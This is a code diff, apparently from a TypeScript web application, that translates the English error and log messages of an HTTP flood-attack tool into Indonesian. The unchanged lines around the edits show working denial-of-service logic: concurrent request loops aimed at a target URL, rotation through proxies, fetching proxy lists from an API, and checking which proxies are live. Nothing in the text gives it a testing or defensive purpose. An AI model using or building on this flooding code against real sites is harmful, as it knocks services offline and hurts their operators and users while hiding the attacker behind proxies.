@@ -32,11 +32,11 @@ export async function startFloodAttack(
   try {
     parsedUrl = new URL(targetUrl);
   } catch (e) {
-    return { totalSent: 0, successful: 0, failed: 0, error: "Invalid target URL. Please include scheme (e.g., http:// or https://)." };
+    return { totalSent: 0, successful: 0, failed: 0, error: "URL target tidak valid. Harap sertakan skema (mis., http:// atau https://)." };
   }
 
   if (parsedUrl.protocol !== "http:" && parsedUrl.protocol !== "https:") {
-     return { totalSent: 0, successful: 0, failed: 0, error: "Target URL must use http or https protocol." };
+     return { totalSent: 0, successful: 0, failed: 0, error: "URL target harus menggunakan protokol http atau https." };
   }
   
   const safeConcurrency = Math.min(Math.max(1, concurrency ?? 50), 500); 
@@ -44,7 +44,7 @@ export async function startFloodAttack(
   const safeDuration = Math.min(Math.max(5, durationInSeconds ?? 10), 60);
 
   if (safeConcurrency <= 0 || safeRate <= 0 || safeDuration <=0) {
-    return { totalSent: 0, successful: 0, failed: 0, error: "Concurrency, rate, and duration must be positive values." };
+    return { totalSent: 0, successful: 0, failed: 0, error: "Konkurensi, tingkat, dan durasi harus bernilai positif." };
   }
 
   const parsedHeaders: HeadersInit = {};
@@ -92,7 +92,7 @@ export async function startFloodAttack(
       .filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://"));
 
     if (parsedProxies.length === 0 && proxiesString.trim().length > 0) {
-        return { totalSent: 0, successful: 0, failed: 0, error: "No valid proxy strings could be parsed. Check format (e.g., host:port or IP:PORT)." };
+        return { totalSent: 0, successful: 0, failed: 0, error: "Tidak ada string proksi yang valid yang dapat diurai. Periksa format (mis., host:port atau IP:PORT)." };
     }
   }
 
@@ -104,7 +104,7 @@ export async function startFloodAttack(
   const startTime = Date.now();
   const endTime = startTime + safeDuration * 1000;
 
-  console.log(`Starting flood: ${method} ${targetUrl}, Concurrency: ${safeConcurrency}, Rate: ${safeRate} RPS, Duration: ${safeDuration}s, Proxies: ${parsedProxies.length}`);
+  console.log(`Mulai banjir: ${method} ${targetUrl}, Konkurensi: ${safeConcurrency}, Tingkat: ${safeRate} RPS, Durasi: ${safeDuration}d, Proksi: ${parsedProxies.length}`);
 
   try {
     while (Date.now() < endTime) {
@@ -133,7 +133,7 @@ export async function startFloodAttack(
           } catch (e) {
             console.error(`Error creating proxy agent for ${proxyConfig}:`, e);
             failed++;
-            statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; // -1 for proxy setup error
+            statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; 
             totalSent++; 
             continue; 
           }
@@ -145,7 +145,7 @@ export async function startFloodAttack(
               const status = response.status;
               statusCodeCounts[status] = (statusCodeCounts[status] || 0) + 1;
               
-              if (response.status >= 200 && response.status < 400) { // Consider 2xx and 3xx as successful for high-level count
+              if (response.status >= 200 && response.status < 400) { 
                 successful++;
               } else {
                 failed++;
@@ -154,9 +154,9 @@ export async function startFloodAttack(
             .catch((e: any) => {
               failed++;
               if (e.name === 'AbortError' || e.name === 'TimeoutError') {
-                 statusCodeCounts[0] = (statusCodeCounts[0] || 0) + 1; // 0 for timeouts/aborts
+                 statusCodeCounts[0] = (statusCodeCounts[0] || 0) + 1; 
               } else {
-                 statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; // -1 for other network errors
+                 statusCodeCounts[-1] = (statusCodeCounts[-1] || 0) + 1; 
               }
             })
             .finally(() => {
@@ -178,10 +178,10 @@ export async function startFloodAttack(
       }
     }
   } catch (e: any) {
-    console.error("Flood attack error:", e);
-    return { totalSent, successful, failed, statusCodeCounts, error: e.message || "An unexpected error occurred during the flood." };
+    console.error("Kesalahan serangan banjir:", e);
+    return { totalSent, successful, failed, statusCodeCounts, error: e.message || "Terjadi kesalahan tak terduga selama banjir." };
   } finally {
-    console.log(`Flood ended: Total Sent: ${totalSent}, Successful: ${successful}, Failed: ${failed}, Status Codes: ${JSON.stringify(statusCodeCounts)}`);
+    console.log(`Banjir berakhir: Total Terkirim: ${totalSent}, Berhasil: ${successful}, Gagal: ${failed}, Kode Status: ${JSON.stringify(statusCodeCounts)}`);
   }
 
   return { totalSent, successful, failed, statusCodeCounts };
@@ -189,12 +189,12 @@ export async function startFloodAttack(
 
 export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: string; error?: string }> {
   if (!apiUrl.trim()) {
-    return { error: "API URL cannot be empty." };
+    return { error: "URL API tidak boleh kosong." };
   }
   try {
     new URL(apiUrl);
   } catch (e) {
-    return { error: "Invalid API URL format. Please include the scheme (e.g., http:// or https://)." };
+    return { error: "Format URL API tidak valid. Harap sertakan skema (mis., http:// atau https://)." };
   }
 
   try {
@@ -203,11 +203,11 @@ export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: s
       headers: { 'Accept': 'text/plain' } 
     }); 
     if (!response.ok) {
-      return { error: `API request failed with status ${response.status}: ${response.statusText}` };
+      return { error: `Permintaan API gagal dengan status ${response.status}: ${response.statusText}` };
     }
     const text = await response.text();
     if (!text.trim()) {
-      return { error: "API returned an empty proxy list." };
+      return { error: "API mengembalikan daftar proksi kosong." };
     }
     
     const lines = text.trim().split('\n');
@@ -215,11 +215,11 @@ export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: s
     
     return { proxies: strippedLines.join('\n') };
   } catch (e: any) {
-    console.error("Error fetching proxies from API:", e);
+    console.error("Kesalahan mengambil proksi dari API:", e);
     if (e.name === 'TimeoutError') {
-        return { error: "API request timed out." };
+        return { error: "Waktu permintaan API habis." };
     }
-    return { error: e.message || "Failed to fetch proxies. Check browser console for more details." };
+    return { error: e.message || "Gagal mengambil proksi. Periksa konsol browser untuk detail lebih lanjut." };
   }
 }
 
@@ -240,7 +240,7 @@ export async function checkProxies(proxiesString: string): Promise<{
     .filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://")); 
 
   if (proxyEntries.length === 0) {
-    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0, error: "No proxies in the correct host:port format found to check. Ensure http(s):// schemes are removed." };
+    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0, error: "Tidak ada proksi dalam format host:port yang benar ditemukan untuk diperiksa. Pastikan skema http(s):// telah dihapus." };
   }
 
   const liveProxiesArray: string[] = [];
